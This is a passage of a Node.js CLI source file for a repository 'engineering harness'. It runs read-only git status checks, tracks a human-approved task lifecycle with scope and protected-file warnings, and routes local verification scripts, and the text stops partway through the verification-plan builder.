#!/usr/bin/env node
// Workspc Engineering Harness — Harness 0 (bootstrap/status only).
//
// Safety invariant this file exists to preserve: the only commands this CLI
// exposes are `status` and `self-test`. Every git call goes through the
// git() wrapper below, which only accepts subcommands in ALLOWED_GIT_
// SUBCOMMANDS (read-only). There is no code path here that can push, commit,
// apply a migration, or write to Supabase. self-test asserts this
// structurally, not by grepping for forbidden words in comments.
'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { spawnSync } = require('child_process');

const REPO_ROOT = path.resolve(__dirname, '..');
// Overridable only for self-test isolation (see cmdSelfTest) — every real
// invocation of this CLI leaves WORKSPC_ENG_DIR_OVERRIDE unset and resolves
// the real .workspc-engineering/ directory.
const ENG_DIR = process.env.WORKSPC_ENG_DIR_OVERRIDE
  ? path.resolve(process.env.WORKSPC_ENG_DIR_OVERRIDE)
  : path.join(REPO_ROOT, '.workspc-engineering');
const SCHEMA_VERSION = 1;
const IS_WIN = process.platform === 'win32';

// ---------------------------------------------------------------------
// Read-only process helpers. spawnSync only, argv arrays only, no shell.
// ---------------------------------------------------------------------

const ALLOWED_GIT_SUBCOMMANDS = ['rev-parse', 'status', 'rev-list'];

function git(args) {
  if (!ALLOWED_GIT_SUBCOMMANDS.includes(args[0])) {
    throw new Error(`harness: git subcommand not allowed: ${args[0]}`);
  }
  return spawnSync('git', args, { cwd: REPO_ROOT, encoding: 'utf8', timeout: 5000 });
}

// npm/npx ship as .cmd shims on Windows, which spawnSync cannot launch
// directly without going through cmd.exe. Routing just those two through a
// fixed `cmd.exe /c <bin> <args>` argv array avoids that failure while
// keeping every argument a fixed literal, never interpolated from
// untrusted input, and without turning on spawnSync's own shell option.
function spawnMaybeWin(bin, args, opts) {
  const useCmdWrapper = IS_WIN && (bin === 'npm' || bin === 'npx');
  const spawnBin = useCmdWrapper ? 'cmd.exe' : bin;
  const spawnArgs = useCmdWrapper ? ['/c', bin, ...args] : args;
  return spawnSync(spawnBin, spawnArgs, { cwd: REPO_ROOT, encoding: 'utf8', ...opts });
}

function checkTool(bin, args) {
  try {
    const res = spawnMaybeWin(bin, args, { timeout: 10000 });
    if (res.error) {
      return res.error.code === 'ENOENT'
        ? { status: 'MISSING' }
        : { status: 'UNKNOWN', detail: res.error.code || 'spawn error' };
    }
    if (typeof res.status === 'number' && res.status !== 0) {
      return { status: 'UNKNOWN', detail: `exit ${res.status}` };
    }
    const out = (res.stdout || res.stderr || '').trim().split('\n')[0];
    return { status: 'READY', detail: out };
  } catch (e) {
    return { status: 'UNKNOWN', detail: 'exception' };
  }
}

function getToolCapabilities() {
  return [
    { label: 'git', ...checkTool('git', ['--version']) },
    { label: 'node', status: 'READY', detail: process.version },
    { label: 'npm', ...checkTool('npm', ['--version']) },
    { label: 'gh', ...checkTool('gh', ['--version']) },
    { label: 'docker', ...checkTool('docker', ['--version']) },
    { label: 'supabase (repo-local via npx)', ...checkTool('npx', ['--no-install', 'supabase', '--version']) },
  ];
}

// ---------------------------------------------------------------------
// Dynamic git/filesystem facts — recomputed every call, never cached.
// ---------------------------------------------------------------------

function getHead() {
  const res = git(['rev-parse', 'HEAD']);
  return res.status === 0 ? res.stdout.trim() : null;
}

function getOriginMain() {
  let res = git(['rev-parse', 'origin/main']);
  if (res.status === 0) return res.stdout.trim();
  res = git(['rev-parse', 'refs/remotes/origin/main']);
  return res.status === 0 ? res.stdout.trim() : null;
}

function getAheadBehind() {
  const res = git(['rev-list', '--left-right', '--count', 'origin/main...HEAD']);
  if (res.status !== 0) return { behind: null, ahead: null };
  const parts = res.stdout.trim().split(/\s+/);
  const behind = parseInt(parts[0], 10);
  const ahead = parseInt(parts[1], 10);
  return {
    behind: Number.isFinite(behind) ? behind : null,
    ahead: Number.isFinite(ahead) ? ahead : null,
  };
}

// Names only — never reads file contents.
function getWorkingTree() {
  const res = git(['status', '--porcelain']);
  if (res.status !== 0) return { staged: 0, modified: 0, untracked: 0, untrackedFiles: [], changedTrackedFiles: [], error: true };
  const lines = res.stdout.split('\n').filter(Boolean);
  let staged = 0;
  let modified = 0;
  const untrackedFiles = [];
  const changedTrackedFiles = [];
  for (const line of lines) {
    const x = line[0];
    const y = line[1];
    const file = line.slice(3);
    if (x === '?' && y === '?') {
      untrackedFiles.push(file);
      continue;
    }
    if (x !== ' ') staged++;
    if (y !== ' ') modified++;
    changedTrackedFiles.push(file);
  }
  return { staged, modified, untracked: untrackedFiles.length, untrackedFiles, changedTrackedFiles };
}

function getMigrationFiles() {
  const dir = path.join(REPO_ROOT, 'supabase', 'migrations');
  let entries;
  try {
    entries = fs.readdirSync(dir);
  } catch (e) {
    return [];
  }
  return entries
    .map((name) => {
      const m = name.match(/^(\d+)_/);
      return m ? { number: parseInt(m[1], 10), file: name } : null;
    })
    .filter(Boolean)
    .sort((a, b) => a.number - b.number);
}

function checkHandoffStaleness(head) {
  const p = path.join(REPO_ROOT, 'HANDOFF_TO_CLAUDE.md');
  let text;
  try {
    text = fs.readFileSync(p, 'utf8');
  } catch (e) {
    return { status: 'UNKNOWN', detail: 'HANDOFF_TO_CLAUDE.md not found' };
  }
  const m = text.match(/Local HEAD \(this snapshot\):\s*`([0-9a-f]{7,40})`/i);
  if (!m) return { status: 'UNKNOWN', detail: 'no machine-detectable commit stamp found' };
  if (!head) return { status: 'UNKNOWN', detail: 'current HEAD unavailable' };
  const stamped = m[1];
  const match = head.startsWith(stamped) || stamped.startsWith(head);
  return match
    ? { status: 'CURRENT', detail: stamped }
    : { status: 'STALE', detail: `snapshot stamped ${stamped}, current HEAD ${head.slice(0, 7)}` };
}

function getVerificationInventory() {
  let pkg = {};
  try {
    pkg = JSON.parse(fs.readFileSync(path.join(REPO_ROOT, 'package.json'), 'utf8'));
  } catch (e) {
    // fall through with empty scripts
  }
  const scripts = pkg.scripts || {};
  const registered = Object.keys(scripts)
    .filter((k) => k === 'verify' || k.startsWith('verify:'))
    .map((k) => ({ name: k, command: `npm run ${k}` }));

  let scriptFiles = [];
  try {
    scriptFiles = fs
      .readdirSync(path.join(REPO_ROOT, 'scripts'))
      .filter((f) => /^verify-.*\.(cjs|ts)$/.test(f));
  } catch (e) {
    // no scripts dir
  }
  const registeredTargets = new Set(
    Object.values(scripts)
      .map((cmd) => {
        const m = String(cmd).match(/scripts\/([\w.-]+)/);
        return m ? m[1] : null;
      })
      .filter(Boolean)
  );
  const manualOnly = scriptFiles.filter((f) => !registeredTargets.has(f));
  return { registered, manualOnly };
}

// ---------------------------------------------------------------------
// Durable state loaders — human-verified facts that cannot be safely
// reconstructed from git/filesystem alone.
// ---------------------------------------------------------------------

function loadJSON(file, fallback) {
  try {
    return JSON.parse(fs.readFileSync(path.join(ENG_DIR, file), 'utf8'));
  } catch (e) {
    return fallback;
  }
}

function loadJSONL(file) {
  try {
    return fs
      .readFileSync(path.join(ENG_DIR, file), 'utf8')
      .split('\n')
      .filter(Boolean)
      .map((line) => JSON.parse(line));
  } catch (e) {
    return [];
  }
}

function parseMigrationRange(rangeStr) {
  const m = String(rangeStr).match(/^(\d+)(?:-(\d+))?$/);
  if (!m) return null;
  const lo = parseInt(m[1], 10);
  const hi = m[2] ? parseInt(m[2], 10) : lo;
  return [lo, hi];
}

// File existence is never sufficient evidence of live application on its
// own — a number only becomes VERIFIED_APPLIED/VERIFIED_UNAPPLIED if a
// human-recorded entry in migration-evidence.json says so. Everything else
// is UNKNOWN, regardless of whether the migration file exists on disk.
function resolveMigrationStatus(number, evidenceEntries) {
  for (const entry of evidenceEntries) {
    const range = parseMigrationRange(entry.migrationRange);
    if (range && number >= range[0] && number <= range[1]) return entry.status;
  }
  return 'UNKNOWN';
}

function summarizeMigrationCoverage(ceiling, evidenceEntries) {
  if (!ceiling) return [];
  const rows = [];
  let i = 1;
  while (i <= ceiling) {
    const status = resolveMigrationStatus(i, evidenceEntries);
    let j = i;
    while (j + 1 <= ceiling && resolveMigrationStatus(j + 1, evidenceEntries) === status) j++;
    rows.push({ range: i === j ? `${i}` : `${i}-${j}`, status });
    i = j + 1;
  }
  return rows;
}

// ---------------------------------------------------------------------
// Harness 1 — durable task lifecycle. active-task.json is local/gitignored
// (churns every phase transition) and is written via temp-file + rename so
// a shutdown mid-write can never leave a half-written file in its place.
// ---------------------------------------------------------------------

const ACTIVE_TASK_FILE = 'active-task.json';

const TASK_CLASSES = [
  'CODE_REFACTOR', 'PRODUCT_FEATURE', 'BUG_FIX', 'SECURITY_HARDENING',
  'DATABASE_MIGRATION', 'DOCUMENTATION_GOVERNANCE', 'SPECIFICATION_ONLY',
  'LIVE_READ_ONLY_AUDIT', 'TOOLING_INFRASTRUCTURE', 'UI_UX_CHANGE',
];

const PHASES = [
  'DISCOVERED', 'PLAN_READY', 'AWAITING_HUMAN_REVIEW', 'APPROVED',
  'IMPLEMENTING', 'VERIFYING', 'DIFF_REVIEW', 'BLOCKED',
  'COMMITTED_LOCAL', 'COMPLETE_LOCAL',
];

// APPROVED is deliberately reachable only through cmdTaskApprove(), never
// through this table — see the human-review rule below.
const ALLOWED_TRANSITIONS = {
  DISCOVERED: ['PLAN_READY'],
  PLAN_READY: ['PLAN_READY', 'AWAITING_HUMAN_REVIEW'],
  AWAITING_HUMAN_REVIEW: ['PLAN_READY'],
  APPROVED: ['IMPLEMENTING'],
  IMPLEMENTING: ['VERIFYING'],
  VERIFYING: ['IMPLEMENTING', 'DIFF_REVIEW'],
  DIFF_REVIEW: ['IMPLEMENTING', 'COMMITTED_LOCAL'],
  COMMITTED_LOCAL: ['COMPLETE_LOCAL'],
  COMPLETE_LOCAL: [],
  BLOCKED: [],
};

const TASK_SUBCOMMANDS = ['new', 'plan', 'phase', 'approve', 'block', 'clear', 'status'];

function loadActiveTask() {
  return loadJSON(ACTIVE_TASK_FILE, null);
}

// Atomic write: same-directory temp file + rename. rename() is atomic on
// both NTFS and POSIX filesystems when source/target share a volume, so a
// shutdown mid-write leaves either the old file or the new one, never a
// half-written one.
function writeActiveTaskAtomic(task) {
  if (!fs.existsSync(ENG_DIR)) fs.mkdirSync(ENG_DIR, { recursive: true });
  const target = path.join(ENG_DIR, ACTIVE_TASK_FILE);
  const tmp = path.join(ENG_DIR, `.active-task.json.tmp-${process.pid}-${crypto.randomBytes(4).toString('hex')}`);
  fs.writeFileSync(tmp, JSON.stringify(task, null, 2) + '\n', 'utf8');
  fs.renameSync(tmp, target);
}

function deleteActiveTask() {
  const target = path.join(ENG_DIR, ACTIVE_TASK_FILE);
  if (fs.existsSync(target)) fs.unlinkSync(target);
}

function genTaskId() {
  return `t-${crypto.randomBytes(4).toString('hex')}`;
}

// Minimal glob support — '**' matches across path separators, '*' matches
// within one segment. Enough for the literal patterns this repo's own
// protected-surfaces.json uses; not a general-purpose glob library.
function globToRegExp(glob) {
  let re = '';
  for (let i = 0; i < glob.length; i++) {
    const c = glob[i];
    if (c === '*' && glob[i + 1] === '*') {
      re += '.*';
      i++;
      if (glob[i + 1] === '/') i++;
    } else if (c === '*') {
      re += '[^/]*';
    } else if ('.+^$()|{}[]\\'.includes(c)) {
      re += '\\' + c;
    } else {
      re += c;
    }
  }
  return new RegExp(`^${re}$`);
}

function matchesAnyGlob(filePath, globs) {
  return (globs || []).some((g) => globToRegExp(g).test(filePath));
}

// Warning-only — never blocks anything in Harness 1.
function computeProtectedSurfaceHits(expectedFiles) {
  const doc = loadJSON('protected-surfaces.json', { surfaces: [] });
  const surfaces = (doc.surfaces || []).filter((s) => s.active);
  const hits = [];
  for (const file of expectedFiles || []) {
    for (const surface of surfaces) {
      if (matchesAnyGlob(file, surface.glob)) {
        hits.push({ surfaceId: surface.id, expectedFile: file, reason: surface.reason });
      }
    }
  }
  return hits;
}

// Warning-only — never blocks anything in Harness 1.
function computeScopeMismatch(expectedFiles, changedTrackedFiles) {
  if (!expectedFiles || !expectedFiles.length) {
    return { checked: false, inScope: [], outsideScope: [] };
  }
  const inScope = [];
  const outsideScope = [];
  for (const file of changedTrackedFiles || []) {
    if (matchesAnyGlob(file, expectedFiles)) inScope.push(file);
    else outsideScope.push(file);
  }
  return { checked: true, inScope, outsideScope };
}

function taskError(message) {
  process.stderr.write(`error: ${message}\n`);
  process.exitCode = 1;
}

function parseFlags(args) {
  const flags = {};
  const positional = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (a.startsWith('--')) {
      const key = a.slice(2);
      const next = args[i + 1];
      if (next === undefined || next.startsWith('--')) {
        flags[key] = true;
      } else {
        flags[key] = next;
        i++;
      }
    } else {
      positional.push(a);
    }
  }
  return { flags, positional };
}

function readPlanInput(flags) {
  if (flags.file) {
    return JSON.parse(fs.readFileSync(String(flags.file), 'utf8'));
  }
  if (flags.stdin) {
    return JSON.parse(fs.readFileSync(0, 'utf8'));
  }
  return null;
}

function touchTask(task) {
  task.updatedAt = new Date().toISOString();
  return task;
}

function cmdTaskNew(rest) {
  const { flags } = parseFlags(rest);
  if (loadActiveTask()) {
    return taskError('a task is already active — run `task status` to see it, or `task clear` once it is COMPLETE_LOCAL');
  }
  const title = flags.title;
  const taskClass = flags.class;
  if (!title || typeof title !== 'string') return taskError('--title <text> is required');
  if (!taskClass || !TASK_CLASSES.includes(taskClass)) {
    return taskError(`--class must be one of: ${TASK_CLASSES.join(', ')}`);
  }
  const now = new Date().toISOString();
  const task = {
    schemaVersion: SCHEMA_VERSION,
    taskId: genTaskId(),
    title,
    taskClass,
    phase: 'DISCOVERED',
    createdAt: now,
    updatedAt: now,
    sourceCommit: getHead(),
    approvedScope: null,
    expectedFiles: [],
    explicitNonGoals: [],
    declaredVerification: [],
    humanDecisionsRequired: [],
    protectedSurfaceHits: [],
    blockers: [],
    blockedFrom: null,
    approval: { approvedAt: null, approvalNote: null, acknowledgedProtectedSurfaces: false },
  };
  writeActiveTaskAtomic(task);
  process.stdout.write(`created task ${task.taskId} (${taskClass}) — phase DISCOVERED\n`);
}

function cmdTaskPlan(rest) {
  const { flags } = parseFlags(rest);
  const task = loadActiveTask();
  if (!task) return taskError('no active task — run `task new` first');
  if (!['DISCOVERED', 'PLAN_READY'].includes(task.phase)) {
    return taskError(`cannot plan from phase ${task.phase} — run \`task phase PLAN_READY\` first if revising after review`);
  }
  let input;
  try {
    input = readPlanInput(flags);
  } catch (e) {
    return taskError(`could not read plan input: ${e.message}`);
  }
  if (!input) return taskError('provide a plan via --file <path.json> or --stdin (piped JSON)');

  const arr = (v) => (Array.isArray(v) ? v.filter((x) => typeof x === 'string') : []);
  task.approvedScope = typeof input.approvedScope === 'string' ? input.approvedScope : task.approvedScope;
  task.expectedFiles = arr(input.expectedFiles);
  task.explicitNonGoals = arr(input.explicitNonGoals);
  task.declaredVerification = arr(input.declaredVerification);
  task.humanDecisionsRequired = arr(input.humanDecisionsRequired);
  task.protectedSurfaceHits = computeProtectedSurfaceHits(task.expectedFiles);
  task.phase = 'PLAN_READY';
  writeActiveTaskAtomic(touchTask(task));
  process.stdout.write(`plan recorded for ${task.taskId} — phase PLAN_READY\n`);
  if (task.protectedSurfaceHits.length) {
    process.stdout.write(`PROTECTED SURFACE HIT(S): ${task.protectedSurfaceHits.map((h) => h.surfaceId).join(', ')}\n`);
  }
}

function cmdTaskPhase(rest) {
  const { positional } = parseFlags(rest);
  const target = positional[0];
  const task = loadActiveTask();
  if (!task) return taskError('no active task');
  if (!target || !PHASES.includes(target)) {
    return taskError(`phase must be one of: ${PHASES.join(', ')}`);
  }
  if (target === 'APPROVED') {
    return taskError('APPROVED cannot be set via `task phase` — use `task approve --note "<text>"`');
  }
  if (target === 'BLOCKED') {
    return taskError('use `task block --reason "<text>"` instead');
  }
  if (task.phase === 'BLOCKED') {
    if (target !== task.blockedFrom) {
      return taskError(`task is BLOCKED — the only valid resume target is ${task.blockedFrom}`);
    }
  } else {
    const allowed = ALLOWED_TRANSITIONS[task.phase] || [];
    if (!allowed.includes(target)) {
      return taskError(`cannot move from ${task.phase} to ${target} — allowed: ${allowed.join(', ') || '(none)'}`);
    }
  }
  task.phase = target;
  writeActiveTaskAtomic(touchTask(task));
  process.stdout.write(`${task.taskId} — phase now ${target}\n`);
}

function cmdTaskApprove(rest) {
  const { flags } = parseFlags(rest);
  const task = loadActiveTask();
  if (!task) return taskError('no active task');
  if (task.phase !== 'AWAITING_HUMAN_REVIEW') {
    return taskError(`can only approve from AWAITING_HUMAN_REVIEW (current phase: ${task.phase})`);
  }
  const note = flags.note;
  if (!note || typeof note !== 'string' || !note.trim()) {
    return taskError('--note "<approval note>" is required');
  }
  if (task.protectedSurfaceHits.length && !flags['ack-protected-surfaces']) {
    const ids = task.protectedSurfaceHits.map((h) => h.surfaceId).join(', ');
    return taskError(`this task hits protected surface(s) [${ids}] — re-run with --ack-protected-surfaces to acknowledge and approve`);
  }
  task.phase = 'APPROVED';
  task.approval = {
    approvedAt: new Date().toISOString(),
    approvalNote: note,
    acknowledgedProtectedSurfaces: task.protectedSurfaceHits.length > 0,
  };
  writeActiveTaskAtomic(touchTask(task));
  process.stdout.write(`${task.taskId} — APPROVED\n`);
}

function cmdTaskBlock(rest) {
  const { flags } = parseFlags(rest);
  const task = loadActiveTask();
  if (!task) return taskError('no active task');
  if (task.phase === 'BLOCKED') return taskError('task is already BLOCKED');
  if (['COMMITTED_LOCAL', 'COMPLETE_LOCAL'].includes(task.phase)) {
    return taskError(`cannot block a task in phase ${task.phase}`);
  }
  const reason = flags.reason;
  if (!reason || typeof reason !== 'string' || !reason.trim()) {
    return taskError('--reason "<why>" is required');
  }
  task.blockers.push({ reason, blockedAt: new Date().toISOString(), blockedFromPhase: task.phase });
  task.blockedFrom = task.phase;
  task.phase = 'BLOCKED';
  writeActiveTaskAtomic(touchTask(task));
  process.stdout.write(`${task.taskId} — BLOCKED (was ${task.blockedFrom})\n`);
}

function cmdTaskClear(rest) {
  const { flags } = parseFlags(rest);
  const task = loadActiveTask();
  if (!task) return taskError('no active task to clear');
  if (task.phase !== 'COMPLETE_LOCAL' && !flags.force) {
    return taskError(`task is not COMPLETE_LOCAL (phase: ${task.phase}) — pass --force --reason "<why>" to override`);
  }
  if (flags.force && (!flags.reason || !String(flags.reason).trim())) {
    return taskError('--force requires --reason "<why>"');
  }
  deleteActiveTask();
  process.stdout.write(`cleared ${task.taskId}\n`);
}

function renderActiveTaskSection(lines, activeTask, workingTree) {
  lines.push('');
  lines.push('=== ACTIVE TASK ===');
  if (!activeTask) {
    lines.push('  (none)');
    return;
  }
  const t = activeTask;
  const scope = computeScopeMismatch(t.expectedFiles, workingTree.changedTrackedFiles);
  const liveHits = computeProtectedSurfaceHits(t.expectedFiles);
  lines.push(`  id / title     : ${t.taskId} — ${t.title}`);
  lines.push(`  class          : ${t.taskClass}`);
  if (t.taskClass === 'DATABASE_MIGRATION') {
    lines.push('  *** DEPLOYMENT FREEZE ACTIVE — migration may be created locally but must not be applied ***');
  }
  lines.push(`  phase          : ${t.phase}${t.phase === 'BLOCKED' ? ` (blocked from ${t.blockedFrom})` : ''}`);
  lines.push(`  source commit  : ${short(t.sourceCommit)}`);
  lines.push(`  approval       : ${t.approval && t.approval.approvedAt ? `APPROVED at ${t.approval.approvedAt} — "${t.approval.approvalNote}"` : 'not approved'}`);
  lines.push(`  declared scope : ${t.approvedScope || '(none recorded)'}`);
  lines.push(`  expected files : ${t.expectedFiles.length ? t.expectedFiles.join(', ') : '(none recorded)'}`);
  lines.push(`  non-goals      : ${t.explicitNonGoals.length ? t.explicitNonGoals.join(', ') : '(none recorded)'}`);
  lines.push(`  declared verify: ${t.declaredVerification.length ? t.declaredVerification.join(', ') : '(none recorded)'}`);
  if (!scope.checked) {
    lines.push('  scope check    : (no expectedFiles declared yet — nothing to compare)');
  } else {
    lines.push(`  scope check    : ${scope.inScope.length} IN_SCOPE, ${scope.outsideScope.length} OUTSIDE_DECLARED_SCOPE`);
    for (const f of scope.outsideScope) lines.push(`    OUTSIDE_DECLARED_SCOPE: ${f}`);
  }
  lines.push(`  protected hits : ${liveHits.length ? liveHits.map((h) => h.surfaceId).join(', ') : '(none)'}`);
  lines.push(`  blockers       : ${t.blockers.length ? t.blockers.map((b) => `${b.reason} (from ${b.blockedFromPhase})`).join('; ') : '(none)'}`);
  lines.push(`  human decisions: ${t.humanDecisionsRequired.length ? t.humanDecisionsRequired.join('; ') : '(none recorded)'}`);
  if (t.verification && t.verification.results && t.verification.results.length) {
    lines.push(`  verification   : (last run ${t.verification.lastRunAt})`);
    for (const r of t.verification.results) {
      lines.push(`    ${r.status.padEnd(15)} ${r.checkId} — ${r.message}`);
    }
  } else {
    lines.push('  verification   : (none run yet — see `task verify --plan`)');
  }
}

// ---------------------------------------------------------------------
// Harness 2 — verification router. Selects existing verify-* scripts by
// task class + changed paths + declared verification; executes only
// LOCAL_STATIC/LOCAL_LOGIC/LOCAL_BUILD checks automatically. Remote-read
// requires --remote-read at invocation time; local-test-mutation and
// production-mutation checks are never auto-executed by anything here —
// there is deliberately no registered check with safety
// PRODUCTION_MUTATION at all (see self-test).
// ---------------------------------------------------------------------

const SAFETY = {
  LOCAL_STATIC: 'LOCAL_STATIC',
  LOCAL_LOGIC: 'LOCAL_LOGIC',
  LOCAL_BUILD: 'LOCAL_BUILD',
  REMOTE_READ_ONLY: 'REMOTE_READ_ONLY',
  LOCAL_TEST_MUTATION: 'LOCAL_TEST_MUTATION',
  PRODUCTION_MUTATION: 'PRODUCTION_MUTATION',
};
const AUTO_EXECUTABLE_SAFETY = [SAFETY.LOCAL_STATIC, SAFETY.LOCAL_LOGIC, SAFETY.LOCAL_BUILD];

// Synthetic checks run in-process (no subprocess) — pure inspection of
// already-loaded state, never SQL, never a live call.
function synthMigrationState() {
  const files = getMigrationFiles();
  const ceiling = files.length ? files[files.length - 1].number : null;
  const evidence = (loadJSON('migration-evidence.json', { entries: [] }) || { entries: [] }).entries;
  const freeze = loadJSON('freeze.json', null);
  const coverage = summarizeMigrationCoverage(ceiling, evidence);
  const summary = coverage.map((r) => `${r.range}:${r.status}`).join(', ');
  return {
    status: ceiling === null ? 'FAIL' : 'PASS',
    message: `ceiling=${ceiling === null ? 'UNKNOWN' : ceiling}; freeze=${freeze && freeze.active ? 'ACTIVE' : 'INACTIVE/UNKNOWN'}; ${summary || '(no migrations found)'}`,
  };
}

function synthSpecOnlyScope(changedPaths) {
  const offenders = (changedPaths || []).filter((p) => p.startsWith('src/') || p.startsWith('supabase/migrations/'));
  return offenders.length
    ? { status: 'FAIL', message: `SPECIFICATION_ONLY task touched src/ or supabase/migrations/: ${offenders.join(', ')}` }
    : { status: 'PASS', message: 'no src/ or supabase/migrations/ paths changed' };
}

const CHECK_REGISTRY = [
  {
    id: 'npm-verify',
    description: 'tsc --noEmit + vite build',
    category: 'BUILD',
    safety: SAFETY.LOCAL_BUILD,
    command: ['npm', 'run', 'verify'],
    aliases: ['npm run verify', 'verify'],
    timeoutMs: 180000,
  },
  {
    id: 'harness-self-test',
    description: 'Harness self-test suite',
    category: 'HARNESS',
    safety: SAFETY.LOCAL_LOGIC,
    command: ['node', 'scripts/harness.cjs', 'self-test'],
    aliases: ['harness self-test', 'npm run harness -- self-test'],
    timeoutMs: 120000,
  },
  {
    id: 'verify-tenant-surface',
    description: 'static tenant-surface RLS/RPC tripwire (default mode)',
    category: 'SECURITY',
    safety: SAFETY.LOCAL_STATIC,
    command: ['npm', 'run', 'verify:tenant-surface'],
    aliases: ['npm run verify:tenant-surface', 'verify:tenant-surface', 'tenant-surface'],
    pathRouteId: 'tenant-surface',
    timeoutMs: 30000,
  },
  {
    id: 'verify-tenant-surface-remote-read',
    description: 'adds the one public list_public_tenants() live read (--remote-read)',
    category: 'SECURITY',
    safety: SAFETY.REMOTE_READ_ONLY,
    command: ['npm', 'run', 'verify:tenant-surface', '--', '--remote-read'],
    aliases: ['verify:tenant-surface --remote-read', 'tenant-surface-remote-read'],
    pathRouteId: 'tenant-surface',
    timeoutMs: 30000,
  },
  {
    id: 'verify-tenant-surface-local-mutation',
    description: 'anonymous INSERT/UPDATE negative tests (--local-mutation) — needs its own env vars, run manually outside the harness',
    category: 'SECURITY',
    safety: SAFETY.LOCAL_TEST_MUTATION,
    command: null,
    manualOnly: true,
    aliases: ['verify:tenant-surface --local-mutation', 'tenant-surface-local-mutation'],
    timeoutMs: 30000,
  },
  {
    id: 'verify-resident-email-login',
    description: 'static+logic resident email/login contract check',
    category: 'SECURITY',
    safety: SAFETY.LOCAL_STATIC,
    command: ['node', 'scripts/verify-resident-email-login.cjs'],
    aliases: ['verify-resident-email-login', 'resident-email-login'],
    pathRouteId: 'resident-email-login',
    timeoutMs: 30000,
  },
  {
    id: 'verify-e0-containment',
    description: 'static containment tripwire for the two E0 Edge Functions',
    category: 'SECURITY',
    safety: SAFETY.LOCAL_STATIC,
    command: ['node', 'scripts/verify-e0-containment.cjs'],
    aliases: ['verify-e0-containment', 'e0-containment', 'e0'],
    pathRouteId: 'e0-containment',
    timeoutMs: 30000,
  },
  {
    id: 'verify-roster-reconciliation',
    description: 'in-memory roster-reconciliation regression fixtures',
    category: 'LOGIC',
    safety: SAFETY.LOCAL_LOGIC,
    command: ['npm', 'run', 'verify:roster-reconciliation'],
    aliases: ['npm run verify:roster-reconciliation', 'verify:roster-reconciliation', 'roster-reconciliation'],
    pathRouteId: 'roster-reconciliation',
    timeoutMs: 30000,
  },
  {
    id: 'verify-submission-status',
    description: 'in-memory submission-status regression fixtures',
    category: 'LOGIC',
    safety: SAFETY.LOCAL_LOGIC,
    command: ['npm', 'run', 'verify:submission-status'],
    aliases: ['npm run verify:submission-status', 'verify:submission-status', 'submission-status'],
    pathRouteId: 'submission-status',
    timeoutMs: 30000,
  },
  {
    id: 'migration-state-check',
    description: 'migration ceiling/numbering + verified applied/unapplied evidence + freeze state (no SQL, no live read)',
    category: 'MIGRATION',
    safety: SAFETY.LOCAL_STATIC,
    synthetic: synthMigrationState,
    aliases: ['migration-state-check'],
  },
  {
    id: 'spec-only-scope-check',
    description: 'flags src/ or supabase/migrations/ changes on a SPECIFICATION_ONLY task',
    category: 'ROUTER',
    safety: SAFETY.LOCAL_STATIC,
    synthetic: null, // filled in per-call — needs changedPaths, see buildAndMaybeRunPlan
    aliases: ['spec-only-scope-check'],
  },
  {
    id: 'ui-visual-verification',
    description: 'desktop viewport, mobile viewport, console error check, route reload check',
    category: 'MANUAL',
    safety: SAFETY.LOCAL_STATIC,
    manualOnly: true,
    command: null,
    aliases: ['ui-visual-verification', 'manual-visual-verification'],
  },
  {
    id: 'security-manual-review',
    description: 'manual diff/control-flow review may remain necessary',
    category: 'MANUAL',
    safety: SAFETY.LOCAL_STATIC,
    manualOnly: true,
    command: null,
    aliases: ['security-manual-review', 'manual-security-review'],
  },
  {
    id: 'live-read-only-audit-approval',
    description: 'REQUIRES_EXPLICIT_REMOTE_APPROVAL — do not auto-run any live query for a LIVE_READ_ONLY_AUDIT task',
    category: 'MANUAL',
    safety: SAFETY.REMOTE_READ_ONLY,
    manualOnly: true,
    command: null,
    aliases: ['live-read-only-audit-approval'],
  },
];

function findCheck(id) {
  return CHECK_REGISTRY.find((c) => c.id === id) || null;
}

// Matches a changed path against the module/table this check actually
// covers. Re-verified against current source (not assumed) before writing
// this: verify-roster-reconciliation.ts imports rosterReconciliation from
// src/modules/roster-engine/lib/; verify-submission-status.ts covers
// submissionStatus.ts + its two real call sites; verify-e0-containment.cjs
// covers exactly the two named Edge Functions; verify-resident-email-login
// covers migration 64; verify-tenant-surface covers databaseService.ts plus
// the tenant/chief/platform-operator RPC migrations.
const PATH_ROUTES = [
  {
    id: 'tenant-surface',
    test: (p) => /tenant/i.test(p) || p === 'src/lib/databaseService.ts',
  },
  {
    id: 'resident-email-login',
    test: (p) => p.startsWith('src/modules/auth/') || p === 'supabase/migrations/64_resident_email_login_contract.sql',
  },
  {
    id: 'roster-reconciliation',
    test: (p) => p.startsWith('src/modules/roster-engine/'),
  },
  {
    id: 'submission-status',
    test: (p) => p === 'src/modules/shared/lib/submissionStatus.ts'
      || /ComplianceNudgesView|submissionChaserAgent/.test(p),
  },
  {
    id: 'e0-containment',
    test: (p) => p.startsWith('supabase/functions/'),
  },
];

// checkId -> path route id, derived from CHECK_REGISTRY so the routing
// table and the registry can never silently drift apart.
function checksForPathRoute(routeId) {
  return CHECK_REGISTRY.filter((c) => c.pathRouteId === routeId).map((c) => c.id);
}

const TASK_CLASS_RULES = {
  CODE_REFACTOR: [{ checkId: 'npm-verify' }],
  PRODUCT_FEATURE: [{ checkId: 'npm-verify' }],
  BUG_FIX: [{ checkId: 'npm-verify' }],
  SECURITY_HARDENING: [{ checkId: 'npm-verify' }, { checkId: 'security-manual-review' }],
  DATABASE_MIGRATION: [
    { checkId: 'migration-state-check' },
    { checkId: 'npm-verify', conditionalPathTest: (p) => /\.tsx?$/.test(p) },
  ],
  DOCUMENTATION_GOVERNANCE: [],
  SPECIFICATION_ONLY: [{ checkId: 'spec-only-scope-check' }],
  LIVE_READ_ONLY_AUDIT: [{ checkId: 'live-read-only-audit-approval' }],
  TOOLING_INFRASTRUCTURE: [{ checkId: 'npm-verify' }, { checkId: 'harness-self-test' }],
  UI_UX_CHANGE: [{ checkId: 'npm-verify' }, { checkId: 'ui-visual-verification' }],
};

function resolveDeclaredCommand(declared) {
  const norm = String(declared).trim().toLowerCase();
  return CHECK_REGISTRY.find((c) => (c.aliases || []).some((a) => a.toLowerCase() === norm)) || null;
}

// Pure selection logic — no execution, no I/O beyond what changedPaths /
// task already carry. Safe to call from --plan or from the real run.
function buildVerificationPlan(task, changedPaths) {
  const byId = new Map(); // checkId -> { check, reasons: Set }
  const skipped = []; // { checkId, reason }
  const unregistered = []; // { declared }

  const addSelected = (checkId, reason) => {
    const check = findCheck(checkId);
